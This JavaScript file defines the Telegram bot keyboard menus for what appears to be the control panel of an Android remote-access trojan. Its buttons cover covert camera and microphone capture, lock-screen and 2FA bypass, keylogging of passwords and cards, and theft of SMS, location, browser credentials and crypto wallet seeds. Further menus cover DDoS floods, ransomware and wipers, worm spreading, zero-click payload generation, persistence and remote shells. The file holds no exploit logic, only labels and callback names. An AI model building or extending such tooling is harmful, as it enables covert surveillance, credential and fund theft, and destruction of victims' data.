const { Markup } = require('telegraf');

class Keyboards {
    static getMainKeyboard() {
        const keyboard = [
            // ========== SECTION 1: CAMERA ULTIMATE (25) ==========
            [{ text: '📸🎥 CAMERA ULTIMATE', callback_data: 'section_camera' }],
            [
                { text: '📷 FRONT CAM', callback_data: 'cam_front' },
                { text: '📸 BACK CAM', callback_data: 'cam_back' },
                { text: '🔄 SWITCH', callback_data: 'cam_switch' }
            ],
            [
                { text: '🎥 VIDEO 5s', callback_data: 'video_5' },
                { text: '🎬 VIDEO 10s', callback_data: 'video_10' },
                { text: '🎞️ VIDEO 30s', callback_data: 'video_30' }
            ],
            [
                { text: '📹 VIDEO 60s', callback_data: 'video_60' },
                { text: '🎦 VIDEO 120s', callback_data: 'video_120' },
                { text: '🎥 VIDEO 300s', callback_data: 'video_300' }
            ],
            [
                { text: '📸 BURST 5X', callback_data: 'cam_burst_5' },
                { text: '📸 BURST 10X', callback_data: 'cam_burst_10' },
                { text: '📸 BURST 20X', callback_data: 'cam_burst_20' }
            ],
            [
                { text: '🌙 NIGHT MODE', callback_data: 'cam_night' },
                { text: '⚡ HDR MODE', callback_data: 'cam_hdr' },
                { text: '🔍 ZOOM 2X', callback_data: 'cam_zoom_2' }
            ],
            [
                { text: '🔍 ZOOM 4X', callback_data: 'cam_zoom_4' },
                { text: '🔍 ZOOM 8X', callback_data: 'cam_zoom_8' },
                { text: '🎨 FILTERS', callback_data: 'cam_filters' }
            ],
            [
                { text: '🔄 TIMELAPSE', callback_data: 'cam_timelapse' },
                { text: '🐢 SLOW MOTION', callback_data: 'cam_slowmo' },
                { text: '⚡ FAST MOTION', callback_data: 'cam_fastmo' }
            ],
            [
                { text: '📸 LIVE STREAM', callback_data: 'cam_live' },
                { text: '🎥 BACKGROUND REC', callback_data: 'cam_bg_rec' },
                { text: '🔒 STEALTH MODE', callback_data: 'cam_stealth' }
            ],
            
            // ========== SECTION 2: AUDIO ULTIMATE (20) ==========
            [{ text: '🎙️🔊 AUDIO ULTIMATE', callback_data: 'section_audio' }],
            [
                { text: '🎤 MIC START', callback_data: 'mic_start' },
                { text: '🎤 MIC STOP', callback_data: 'mic_stop' },
                { text: '🎤 MIC 30s', callback_data: 'mic_30' }
            ],
            [
                { text: '🎙️ MIC 60s', callback_data: 'mic_60' },
                { text: '🎙️ MIC 300s', callback_data: 'mic_300' },
                { text: '🎙️ MIC 600s', callback_data: 'mic_600' }
            ],
            [
                { text: '🎙️ LIVE MIC', callback_data: 'mic_live' },
                { text: '🔊 SPEAKER ON', callback_data: 'speaker_on' },
                { text: '🔇 SPEAKER OFF', callback_data: 'speaker_off' }
            ],
            [
                { text: '📢 LOUD MODE', callback_data: 'loud_mode' },
                { text: '🎧 HEADSET', callback_data: 'headset' },
                { text: '🔊 VOL MAX', callback_data: 'vol_max' }
            ],
            [
                { text: '🔉 VOL 75%', callback_data: 'vol_75' },
                { text: '🔉 VOL 50%', callback_data: 'vol_50' },
                { text: '🔈 VOL 25%', callback_data: 'vol_25' }
            ],
            [
                { text: '🔇 VOL 0%', callback_data: 'vol_0' },
                { text: '🎵 EQ SETTINGS', callback_data: 'eq_settings' },
                { text: '🔊 SURROUND', callback_data: 'surround' }
            ],
            
            // ========== SECTION 3: FLASHLIGHT ULTIMATE (15) ==========
            [{ text: '💡✨ FLASHLIGHT ULTIMATE', callback_data: 'section_flash' }],
            [
                { text: '💡 FLASH ON', callback_data: 'flash_on' },
                { text: '💡 FLASH OFF', callback_data: 'flash_off' },
                { text: '✨ STROBE', callback_data: 'flash_strobe' }
            ],
            [
                { text: '⚡ FAST STROBE', callback_data: 'flash_fast' },
                { text: '🐢 SLOW STROBE', callback_data: 'flash_slow' },
                { text: '💥 SOS MODE', callback_data: 'flash_sos' }
            ],
            [
                { text: '🌈 RGB MODE', callback_data: 'flash_rgb' },
                { text: '🎨 COLOR CYCLE', callback_data: 'flash_color' },
                { text: '✨ CANDLE MODE', callback_data: 'flash_candle' }
            ],
            [
                { text: '🔆 BRIGHT 100%', callback_data: 'bright_100' },
                { text: '🔅 BRIGHT 75%', callback_data: 'bright_75' },
                { text: '🔆 BRIGHT 50%', callback_data: 'bright_50' }
            ],
            
            // ========== SECTION 4: VIBRATION ULTIMATE (15) ==========
            [{ text: '📳💫 VIBRATION ULTIMATE', callback_data: 'section_vibe' }],
            [
                { text: '📳 VIBE 1s', callback_data: 'vibe_1' },
                { text: '📳 VIBE 3s', callback_data: 'vibe_3' },
                { text: '📳 VIBE 5s', callback_data: 'vibe_5' }
            ],
            [
                { text: '📳 VIBE 10s', callback_data: 'vibe_10' },
                { text: '📳 VIBE 30s', callback_data: 'vibe_30' },
                { text: '📳 VIBE 60s', callback_data: 'vibe_60' }
            ],
            [
                { text: '🎵 PATTERN 1', callback_data: 'vibe_pattern_1' },
                { text: '🎵 PATTERN 2', callback_data: 'vibe_pattern_2' },
                { text: '🎵 PATTERN 3', callback_data: 'vibe_pattern_3' }
            ],
            [
                { text: '🔁 LOOP VIBE', callback_data: 'vibe_loop' },
                { text: '💥 STRONG VIBE', callback_data: 'vibe_strong' },
                { text: '🌊 WAVE VIBE', callback_data: 'vibe_wave' }
            ],
            
            // ========== SECTION 5: NETWORK ULTIMATE (30) ==========
            [{ text: '🌐📶 NETWORK ULTIMATE', callback_data: 'section_network' }],
            [
                { text: '📶 WIFI ON', callback_data: 'wifi_on' },
                { text: '📶 WIFI OFF', callback_data: 'wifi_off' },
                { text: '🔍 WIFI SCAN', callback_data: 'wifi_scan' }
            ],
            [
                { text: '📊 WIFI INFO', callback_data: 'wifi_info' },
                { text: '🔑 WIFI PASSWORD', callback_data: 'wifi_password' },
                { text: '📡 WIFI SIGNAL', callback_data: 'wifi_signal' }
            ],
            [
                { text: '🔐 WIFI CRACK', callback_data: 'wifi_crack' },
                { text: '🌐 WIFI DEAUTH', callback_data: 'wifi_deauth' },
                { text: '📡 WIFI MONITOR', callback_data: 'wifi_monitor' }
            ],
            [
                { text: '📱 DATA ON', callback_data: 'data_on' },
                { text: '📱 DATA OFF', callback_data: 'data_off' },
                { text: '📊 DATA USAGE', callback_data: 'data_usage' }
            ],
            [
                { text: '📱 2G ONLY', callback_data: 'data_2g' },
                { text: '📱 3G ONLY', callback_data: 'data_3g' },
                { text: '📱 4G ONLY', callback_data: 'data_4g' }
            ],
            [
                { text: '📱 5G ONLY', callback_data: 'data_5g' },
                { text: '📱 AUTO NETWORK', callback_data: 'data_auto' },
                { text: '📱 CARRIER INFO', callback_data: 'carrier_info' }
            ],
            [
                { text: '✈️ AIRPLANE ON', callback_data: 'airplane_on' },
                { text: '✈️ AIRPLANE OFF', callback_data: 'airplane_off' },
                { text: '🔄 TOGGLE', callback_data: 'airplane_toggle' }
            ],
            [
                { text: '🔗 BT ON', callback_data: 'bt_on' },
                { text: '🔗 BT OFF', callback_data: 'bt_off' },
                { text: '📡 BT SCAN', callback_data: 'bt_scan' }
            ],
            [
                { text: '🔗 BT PAIR', callback_data: 'bt_pair' },
                { text: '🔗 BT UNPAIR', callback_data: 'bt_unpair' },
                { text: '📡 BT DEVICES', callback_data: 'bt_devices' }
            ],
            [
                { text: '🌐 HOTSPOT ON', callback_data: 'hotspot_on' },
                { text: '🌐 HOTSPOT OFF', callback_data: 'hotspot_off' },
                { text: '🔑 HOTSPOT PASS', callback_data: 'hotspot_pass' }
            ],
            [
                { text: '🔒 VPN ON', callback_data: 'vpn_on' },
                { text: '🔒 VPN OFF', callback_data: 'vpn_off' },
                { text: '🌍 VPN CONFIG', callback_data: 'vpn_config' }
            ],
            
            // ========== SECTION 6: SECURITY ULTIMATE (25) ==========
            [{ text: '🔒🔓 SECURITY ULTIMATE', callback_data: 'section_security' }],
            [
                { text: '🔒 LOCK NOW', callback_data: 'lock' },
                { text: '🔓 UNLOCK', callback_data: 'unlock' },
                { text: '⏭️ SLIDE', callback_data: 'slide' }
            ],
            [
                { text: '🔢 BYPASS PIN', callback_data: 'bypass_pin' },
                { text: '🔐 BYPASS PATTERN', callback_data: 'bypass_pattern' },
                { text: '🔑 BYPASS PASSWORD', callback_data: 'bypass_pass' }
            ],
            [
                { text: '🔄 BYPASS FINGER', callback_data: 'bypass_finger' },
                { text: '👁️ BYPASS FACE', callback_data: 'bypass_face' },
                { text: '🔓 BYPASS ALL', callback_data: 'bypass_all' }
            ],
            [
                { text: '🔐 CHANGE PIN', callback_data: 'change_pin' },
                { text: '🔑 CHANGE PATTERN', callback_data: 'change_pattern' },
                { text: '🔒 CHANGE PASS', callback_data: 'change_pass' }
            ],
            [
                { text: '👆 ADD FINGER', callback_data: 'add_finger' },
                { text: '👤 ADD FACE', callback_data: 'add_face' },
                { text: '🗑️ REMOVE LOCK', callback_data: 'remove_lock' }
            ],
            [
                { text: '🔒 ENCRYPT DEVICE', callback_data: 'encrypt_device' },
                { text: '🔓 DECRYPT DEVICE', callback_data: 'decrypt_device' },
                { text: '🔐 SECURE BOOT', callback_data: 'secure_boot' }
            ],
            [
                { text: '💀 FACTORY RESET', callback_data: 'factory_reset' },
                { text: '🔄 FORCE RESET', callback_data: 'force_reset' },
                { text: '⚡ HARD RESET', callback_data: 'hard_reset' }
            ],
            
            // ========== SECTION 7: DATA EXTRACTION ULTIMATE (30) ==========
            [{ text: '💾📁 DATA EXTRACTION', callback_data: 'section_data' }],
            [
                { text: '💬 ALL SMS', callback_data: 'get_sms' },
                { text: '📞 CALL LOGS', callback_data: 'get_calls' },
                { text: '👥 CONTACTS', callback_data: 'get_contacts' }
            ],
            [
                { text: '💬 SMS BY DATE', callback_data: 'get_sms_date' },
                { text: '📞 CALLS BY DATE', callback_data: 'get_calls_date' },
                { text: '👥 EXPORT CONTACTS', callback_data: 'export_contacts' }
            ],
            [
                { text: '🌍 LOCATION', callback_data: 'get_location' },
                { text: '📍 GPS TRACK', callback_data: 'gps_track' },
                { text: '🗺️ MAP VIEW', callback_data: 'map_view' }
            ],
            [
                { text: '📍 LIVE LOCATION', callback_data: 'live_location' },
                { text: '📜 LOC HISTORY', callback_data: 'location_history' },
                { text: '🗺️ GEO FENCE', callback_data: 'geo_fence' }
            ],
            [
                { text: '📸 ALL PHOTOS', callback_data: 'get_photos' },
                { text: '🎥 ALL VIDEOS', callback_data: 'get_videos' },
                { text: '🎵 ALL AUDIO', callback_data: 'get_audio' }
            ],
            [
                { text: '📄 DOCUMENTS', callback_data: 'get_docs' },
                { text: '📦 APK FILES', callback_data: 'get_apk' },
                { text: '🗂️ ALL FILES', callback_data: 'get_all_files' }
            ],
            [
                { text: '📸 PHOTOS DATE', callback_data: 'get_photos_date' },
                { text: '🎥 VIDEOS DATE', callback_data: 'get_videos_date' },
                { text: '🗑️ DELETED FILES', callback_data: 'get_deleted' }
            ],
            [
                { text: '🔑 SAVED PASS', callback_data: 'get_passwords' },
                { text: '🍪 BROWSER COOKIES', callback_data: 'get_cookies' },
                { text: '📜 BROWSER HIST', callback_data: 'get_history' }
            ],
            [
                { text: '📱 WHATSAPP DATA', callback_data: 'get_whatsapp' },
                { text: '📘 FB DATA', callback_data: 'get_facebook' },
                { text: '📷 IG DATA', callback_data: 'get_instagram' }
            ],
            
            // ========== SECTION 8: FILE MANAGER ULTIMATE (25) ==========
            [{ text: '📂🗃️ FILE MANAGER', callback_data: 'section_files' }],
            [
                { text: '📁 FILE MANAGER', callback_data: 'file_manager' },
                { text: '📥 DOWNLOAD', callback_data: 'download_file' },
                { text: '📤 UPLOAD', callback_data: 'upload_file' }
            ],
            [
                { text: '🗑️ DELETE', callback_data: 'delete_file' },
                { text: '📋 COPY', callback_data: 'copy_file' },
                { text: '✂️ MOVE', callback_data: 'move_file' }
            ],
            [
                { text: '📝 RENAME', callback_data: 'rename_file' },
                { text: '🔐 ZIP', callback_data: 'zip_file' },
                { text: '🔓 UNZIP', callback_data: 'unzip' }
            ],
            [
                { text: '🔒 ENCRYPT', callback_data: 'encrypt_file' },
                { text: '🔓 DECRYPT', callback_data: 'decrypt_file' },
                { text: '📊 FILE INFO', callback_data: 'file_info' }
            ],
            [
                { text: '📁 CREATE FOLDER', callback_data: 'create_folder' },
                { text: '🗑️ DELETE FOLDER', callback_data: 'delete_folder' },
                { text: '📋 FOLDER INFO', callback_data: 'folder_info' }
            ],
            [
                { text: '🔍 SEARCH FILES', callback_data: 'search_files' },
                { text: '📊 STORAGE MAP', callback_data: 'storage_map' },
                { text: '🧹 CLEAN JUNK', callback_data: 'clean_junk' }
            ],
            [
                { text: '💾 BACKUP ALL', callback_data: 'backup_all' },
                { text: '🔄 RESTORE', callback_data: 'restore_backup' },
                { text: '☁️ CLOUD BACKUP', callback_data: 'cloud_backup' }
            ],
            
            // ========== SECTION 9: SCREEN CONTROL ULTIMATE (20) ==========
            [{ text: '🖥️📱 SCREEN ULTIMATE', callback_data: 'section_screen' }],
            [
                { text: '📸 SCREENSHOT', callback_data: 'screenshot' },
                { text: '🎥 SCREEN REC', callback_data: 'screen_rec' },
                { text: '⏹️ STOP REC', callback_data: 'screen_rec_stop' }
            ],
            [
                { text: '🎥 REC 30s', callback_data: 'screen_rec_30' },
                { text: '🎥 REC 60s', callback_data: 'screen_rec_60' },
                { text: '🎥 REC 300s', callback_data: 'screen_rec_300' }
            ],
            [
                { text: '🖼️ WALLPAPER', callback_data: 'wallpaper' },
                { text: '🔆 BRIGHT UP', callback_data: 'bright_up' },
                { text: '🔅 BRIGHT DOWN', callback_data: 'bright_down' }
            ],
            [
                { text: '🌙 DARK MODE', callback_data: 'dark_mode' },
                { text: '☀️ LIGHT MODE', callback_data: 'light_mode' },
                { text: '🎨 THEMES', callback_data: 'themes' }
            ],
            [
                { text: '📱 SCREEN ON', callback_data: 'screen_on' },
                { text: '📱 SCREEN OFF', callback_data: 'screen_off' },
                { text: '🔄 TOGGLE', callback_data: 'screen_toggle' }
            ],
            [
                { text: '📱 SCREEN REC LIVE', callback_data: 'screen_rec_live' },
                { text: '🎬 SCREEN STREAM', callback_data: 'screen_stream' },
                { text: '🔍 SCREEN ZOOM', callback_data: 'screen_zoom' }
            ],
            
            // ========== SECTION 10: APPS CONTROL ULTIMATE (25) ==========
            [{ text: '📱⚙️ APPS ULTIMATE', callback_data: 'section_apps' }],
            [
                { text: '📋 INSTALLED', callback_data: 'list_apps' },
                { text: '🚀 OPEN APP', callback_data: 'open_app' },
                { text: '❌ UNINSTALL', callback_data: 'uninstall_app' }
            ],
            [
                { text: '🔄 FORCE STOP', callback_data: 'force_stop' },
                { text: '⚡ CLEAR DATA', callback_data: 'clear_app_data' },
                { text: '🗑️ CLEAR CACHE', callback_data: 'clear_cache' }
            ],
            [
                { text: '📦 INSTALL APK', callback_data: 'install_apk' },
                { text: '🔒 HIDE APP', callback_data: 'hide_app' },
                { text: '🔓 UNHIDE APP', callback_data: 'unhide_app' }
            ],
            [
                { text: '📊 APP USAGE', callback_data: 'app_usage' },
                { text: '⏱️ APP TIMER', callback_data: 'app_timer' },
                { text: '🚫 BLOCK APP', callback_data: 'block_app' }
            ],
            [
                { text: '🔄 BACKUP APP', callback_data: 'backup_app' },
                { text: '📤 SHARE APP', callback_data: 'share_app' },
                { text: '🔍 APP DETAILS', callback_data: 'app_details' }
            ],
            [
                { text: '📱 SYSTEM APPS', callback_data: 'system_apps' },
                { text: '🔧 DISABLE APP', callback_data: 'disable_app' },
                { text: '🔧 ENABLE APP', callback_data: 'enable_app' }
            ],
            [
                { text: '🔐 APP LOCK', callback_data: 'app_lock' },
                { text: '📊 APP PERMISSIONS', callback_data: 'app_permissions' },
                { text: '🔄 APP ACTIVITIES', callback_data: 'app_activities' }
            ],
            
            // ========== SECTION 11: SYSTEM CONTROL ULTIMATE (30) ==========
            [{ text: '⚙️🔧 SYSTEM ULTIMATE', callback_data: 'section_system' }],
            [
                { text: 'ℹ️ SYSTEM INFO', callback_data: 'sysinfo' },
                { text: '🔋 BATTERY', callback_data: 'battery' },
                { text: '💾 RAM INFO', callback_data: 'ram_info' }
            ],
            [
                { text: '📀 STORAGE', callback_data: 'storage' },
                { text: '📱 DEVICE ID', callback_data: 'device_id' },
                { text: '🔐 ROOT STATUS', callback_data: 'root_status' }
            ],
            [
                { text: '🌡️ TEMPERATURE', callback_data: 'temperature' },
                { text: '📊 CPU INFO', callback_data: 'cpu_info' },
                { text: '🎮 GPU INFO', callback_data: 'gpu_info' }
            ],
            [
                { text: '🔋 BATTERY SAVE', callback_data: 'battery_save' },
                { text: '⚡ PERFORMANCE', callback_data: 'performance' },
                { text: '🧹 CLEAN JUNK', callback_data: 'clean_junk_sys' }
            ],
            [
                { text: '🔄 REBOOT', callback_data: 'reboot' },
                { text: '⏻ POWER OFF', callback_data: 'poweroff' },
                { text: '💀 FACTORY RESET', callback_data: 'factory_reset_sys' }
            ],
            [
                { text: '📱 BOOTLOADER', callback_data: 'bootloader' },
                { text: '🔧 RECOVERY MODE', callback_data: 'recovery' },
                { text: '📲 FASTBOOT', callback_data: 'fastboot' }
            ],
            [
                { text: '🔒 ENABLE USB DBG', callback_data: 'usb_debug' },
                { text: '🔓 DISABLE USB DBG', callback_data: 'usb_debug_off' },
                { text: '📡 DEV OPTIONS', callback_data: 'developer_opts' }
            ],
            [
                { text: '🔐 SELINUX', callback_data: 'selinux' },
                { text: '🔧 KERNEL INFO', callback_data: 'kernel_info' },
                { text: '📊 PROCESSES', callback_data: 'processes' }
            ],
            
            // ========== SECTION 12: KEYLOGGER ULTIMATE (15) ==========
            [{ text: '⌨️📝 KEYLOGGER', callback_data: 'section_keylog' }],
            [
                { text: '⌨️ START LOG', callback_data: 'keylog_start' },
                { text: '⌨️ STOP LOG', callback_data: 'keylog_stop' },
                { text: '📋 GET LOGS', callback_data: 'keylog_get' }
            ],
            [
                { text: '📊 LOG STATS', callback_data: 'keylog_stats' },
                { text: '🗑️ CLEAR LOGS', callback_data: 'keylog_clear' },
                { text: '📤 UPLOAD LOGS', callback_data: 'keylog_upload' }
            ],
            [
                { text: '🔑 CAPTURE PASS', callback_data: 'keylog_pass' },
                { text: '💳 CAPTURE CARDS', callback_data: 'keylog_cards' },
                { text: '📧 EMAIL LOGS', callback_data: 'keylog_email' }
            ],
            [
                { text: '📊 LIVE KEYLOG', callback_data: 'keylog_live' },
                { text: '🔍 SEARCH LOGS', callback_data: 'keylog_search' },
                { text: '📈 KEYLOG STATS', callback_data: 'keylog_stats' }
            ],
            
            // ========== SECTION 13: BROWSER ULTIMATE (20) ==========
            [{ text: '🌐🔍 BROWSER ULTIMATE', callback_data: 'section_browser' }],
            [
                { text: '📜 HISTORY', callback_data: 'browser_history' },
                { text: '🔖 BOOKMARKS', callback_data: 'browser_bookmarks' },
                { text: '🍪 COOKIES', callback_data: 'browser_cookies' }
            ],
            [
                { text: '🔑 PASSWORDS', callback_data: 'browser_passwords' },
                { text: '💳 SAVED CARDS', callback_data: 'browser_cards' },
                { text: '📝 AUTO FILL', callback_data: 'browser_autofill' }
            ],
            [
                { text: '📊 BROWSER STATS', callback_data: 'browser_stats' },
                { text: '🗑️ CLEAR DATA', callback_data: 'browser_clear' },
                { text: '🌐 OPEN URL', callback_data: 'browser_open' }
            ],
            [
                { text: '🔍 SEARCH HIST', callback_data: 'search_history' },
                { text: '📥 DOWNLOADS', callback_data: 'browser_downloads' },
                { text: '🔧 SETTINGS', callback_data: 'browser_settings' }
            ],
            [
                { text: '🌐 INJECT SCRIPT', callback_data: 'inject_script' },
                { text: '🔍 DARK WEB', callback_data: 'dark_web' },
                { text: '📡 NETWORK LOGS', callback_data: 'network_logs' }
            ],
            
            // ========== SECTION 14: SOCIAL MEDIA (15) ==========
            [{ text: '📱🌐 SOCIAL MEDIA', callback_data: 'section_social' }],
            [
                { text: '📘 FACEBOOK', callback_data: 'fb_data' },
                { text: '📷 INSTAGRAM', callback_data: 'ig_data' },
                { text: '💬 WHATSAPP', callback_data: 'wa_data' }
            ],
            [
                { text: '🐦 TWITTER', callback_data: 'twitter_data' },
                { text: '📱 TELEGRAM', callback_data: 'tg_data' },
                { text: '🎵 TIKTOK', callback_data: 'tiktok_data' }
            ],
            [
                { text: '🔑 SOCIAL PASS', callback_data: 'social_pass' },
                { text: '📜 SOCIAL HIST', callback_data: 'social_history' },
                { text: '🍪 SOCIAL COOKIES', callback_data: 'social_cookies' }
            ],
            [
                { text: '🔓 SOCIAL HACK', callback_data: 'social_hack' },
                { text: '📊 SOCIAL STATS', callback_data: 'social_stats' },
                { text: '🔐 2FA BYPASS', callback_data: 'bypass_2fa' }
            ],
            
            // ========== SECTION 15: CRYPTO WALLET (12) ==========
            [{ text: '💰🔐 CRYPTO WALLET', callback_data: 'section_crypto' }],
            [
                { text: '💰 BITCOIN', callback_data: 'btc_wallet' },
                { text: '💎 ETHEREUM', callback_data: 'eth_wallet' },
                { text: '🪙 BINANCE', callback_data: 'binance_data' }
            ],
            [
                { text: '📊 CRYPTO BAL', callback_data: 'crypto_balance' },
                { text: '🔑 PRIVATE KEYS', callback_data: 'private_keys' },
                { text: '📜 TRANSACTIONS', callback_data: 'crypto_tx' }
            ],
            [
                { text: '💱 EXCHANGE API', callback_data: 'exchange_api' },
                { text: '🔐 WALLET SEED', callback_data: 'wallet_seed' },
                { text: '🌐 BLOCKCHAIN', callback_data: 'blockchain_data' }
            ],
            
            // ========== SECTION 16: DDOS & ATTACK (12) ==========
            [{ text: '⚔️💀 DDOS ATTACK', callback_data: 'section_ddos' }],
            [
                { text: '🌐 HTTP FLOOD', callback_data: 'http_flood' },
                { text: '📡 UDP FLOOD', callback_data: 'udp_flood' },
                { text: '🔌 TCP FLOOD', callback_data: 'tcp_flood' }
            ],
            [
                { text: '📱 SMS BOMB', callback_data: 'sms_bomb' },
                { text: '📞 CALL BOMB', callback_data: 'call_bomb' },
                { text: '🔗 DDOS STOP', callback_data: 'ddos_stop' }
            ],
            [
                { text: '🌐 DNS AMP', callback_data: 'dns_amp' },
                { text: '🔍 NTP AMP', callback_data: 'ntp_amp' },
                { text: '💀 SLOWLORIS', callback_data: 'slowloris' }
            ],
            
            // ========== SECTION 17: RANSOMWARE & WIPER (12) ==========
            [{ text: '💀⚠️ RANSOMWARE', callback_data: 'section_ransom' }],
            [
                { text: '🔒 ENCRYPT', callback_data: 'ransom_encrypt' },
                { text: '🔓 DECRYPT', callback_data: 'ransom_decrypt' },
                { text: '💰 RANSOM NOTE', callback_data: 'ransom_note' }
            ],
            [
                { text: '🗑️ WIPE DATA', callback_data: 'wipe_data' },
                { text: '📱 WIPE SD', callback_data: 'wipe_sd' },
                { text: '💀 DESTROY SYS', callback_data: 'destroy_system' }
            ],
            [
                { text: '🔒 LOCK FILES', callback_data: 'lock_files' },
                { text: '💰 BITCOIN ADDR', callback_data: 'bitcoin_addr' },
                { text: '⏰ TIMER', callback_data: 'ransom_timer' }
            ],
            
            // ========== SECTION 18: SPREADER & WORM (12) ==========
            [{ text: '🪱🐛 SPREADER', callback_data: 'section_spreader' }],
            [
                { text: '📱 SPREAD CONTACT', callback_data: 'spread_contacts' },
                { text: '🔗 SPREAD LINK', callback_data: 'spread_link' },
                { text: '📲 SPREAD BT', callback_data: 'spread_bt' }
            ],
            [
                { text: '🪱 WORM MODE', callback_data: 'worm_mode' },
                { text: '📡 AUTO SPREAD', callback_data: 'auto_spread' },
                { text: '🔗 MAL LINK', callback_data: 'malicious_link' }
            ],
            [
                { text: '📱 SMS SPREAD', callback_data: 'sms_spread' },
                { text: '🔗 QR SPREAD', callback_data: 'qr_spread' },
                { text: '🌐 WEB SPREAD', callback_data: 'web_spread' }
            ],
            
            // ========== SECTION 19: ZERO-CLICK ULTIMATE (20) ==========
            [{ text: '🎯💀 ZERO-CLICK', callback_data: 'section_zero' }],
            [
                { text: '📱 GEN PAYLOAD', callback_data: 'gen_payload' },
                { text: '📸 GEN JPG', callback_data: 'gen_jpg' },
                { text: '🎵 GEN MP3', callback_data: 'gen_mp3' }
            ],
            [
                { text: '🎥 GEN MP4', callback_data: 'gen_mp4' },
                { text: '📄 GEN PDF', callback_data: 'gen_pdf' },
                { text: '🔗 GEN LINK', callback_data: 'gen_link' }
            ],
            [
                { text: '📱 GEN APK', callback_data: 'gen_apk' },
                { text: '🔧 GEN EXPLOIT', callback_data: 'gen_exploit' },
                { text: '⚡ GEN METASPLOIT', callback_data: 'gen_msf' }
            ],
            [
                { text: '📤 SEND WHATSAPP', callback_data: 'send_wa' },
                { text: '📤 SEND TG', callback_data: 'send_tg' },
                { text: '🔗 GEN QR', callback_data: 'gen_qr' }
            ],
            [
                { text: '📊 CHECK STATUS', callback_data: 'check_status' },
                { text: '🔄 AUTO DEPLOY', callback_data: 'auto_deploy' },
                { text: '🎯 EXPLOIT DB', callback_data: 'exploit_db' }
            ],
            [
                { text: '🔍 VULN SCAN', callback_data: 'vuln_scan' },
                { text: '📡 METERPRETER', callback_data: 'meterpreter' },
                { text: '🔧 CUSTOM PAYLOAD', callback_data: 'custom_payload' }
            ],
            
            // ========== SECTION 20: EXTRA ULTIMATE (20) ==========
            [{ text: '⚡🔧 EXTRA ULTIMATE', callback_data: 'section_extra' }],
            [
                { text: '🔋 BATTERY SAVE', callback_data: 'battery_save' },
                { text: '⚡ PERFORMANCE', callback_data: 'performance' },
                { text: '🧹 CLEAN JUNK', callback_data: 'clean_junk_extra' }
            ],
            [
                { text: '📊 CPU INFO', callback_data: 'cpu_info' },
                { text: '🌡️ TEMPERATURE', callback_data: 'temperature' },
                { text: '📡 SENSORS', callback_data: 'sensors' }
            ],
            [
                { text: '📱 SCREEN INFO', callback_data: 'screen_info' },
                { text: '🔐 SECURITY CHECK', callback_data: 'security_check' },
                { text: '📊 BENCHMARK', callback_data: 'benchmark' }
            ],
            [
                { text: '🔋 BATTERY STATS', callback_data: 'battery_stats' },
                { text: '📱 DEVICE NAME', callback_data: 'device_name' },
                { text: '🔧 DEVICE SETTINGS', callback_data: 'device_settings' }
            ],
            [
                { text: '📊 NETWORK STATS', callback_data: 'network_stats' },
                { text: '🔍 PORT SCAN', callback_data: 'port_scan' },
                { text: '🌐 IP INFO', callback_data: 'ip_info' }
            ],
            [
                { text: '🔑 PASSWORD CRACK', callback_data: 'password_crack' },
                { text: '📡 MITM ATTACK', callback_data: 'mitm_attack' },
                { text: '🔍 PACKET SNIFF', callback_data: 'packet_sniff' }
            ],
            
            // ========== SECTION 21: SESSION CONTROL (10) ==========
            [{ text: '🔌💀 SESSION', callback_data: 'section_session' }],
            [
                { text: '📋 ACTIVE SESSIONS', callback_data: 'list_sessions' },
                { text: '🎯 SELECT SESSION', callback_data: 'select_session' },
                { text: '💀 KILL SESSION', callback_data: 'kill_session' }
            ],
            [
                { text: '🔄 RE-CONNECT', callback_data: 'reconnect' },
                { text: '🔐 PERSISTENCE', callback_data: 'persistence' },
                { text: '📊 SESSION INFO', callback_data: 'session_info' }
            ],
            [
                { text: '📋 SESSION LOGS', callback_data: 'session_logs' },
                { text: '🔌 REMOTE SHELL', callback_data: 'remote_shell' },
                { text: '📡 WEBSOCKET', callback_data: 'websocket' }
            ],
            
            // ========== SECTION 22: HELP & INFO (6) ==========
            [{ text: '❓📖 HELP & INFO', callback_data: 'section_help' }],
            [
                { text: '❓ HELP', callback_data: 'help' },
                { text: 'ℹ️ ABOUT', callback_data: 'about' },
                { text: '📊 STATUS', callback_data: 'status' }
            ],
            [
                { text: '📈 STATISTICS', callback_data: 'statistics' },
                { text: '⚙️ SETTINGS', callback_data: 'settings' },
                { text: '🔧 CONFIG', callback_data: 'config' }
            ]
        ];
        
        return Markup.inlineKeyboard(keyboard);
    }
    
    static getSessionKeyboard(sessions) {
        const keyboard = [];
        
        sessions.forEach(session => {
            keyboard.push([{
                text: `📱 ${session.device_name} - ${session.device_model}`,
                callback_data: `select_${session.session_id}`
            }]);
        });
        
        keyboard.push([{ text: '🔙 BACK TO MAIN', callback_data: 'back_main' }]);
        
        return Markup.inlineKeyboard(keyboard);
    }
    
    static getBackKeyboard() {
        return Markup.inlineKeyboard([
            [{ text: '🔙 BACK TO MAIN MENU', callback_data: 'back_main' }]
        ]);
    }
}

module.exports = Keyboards;
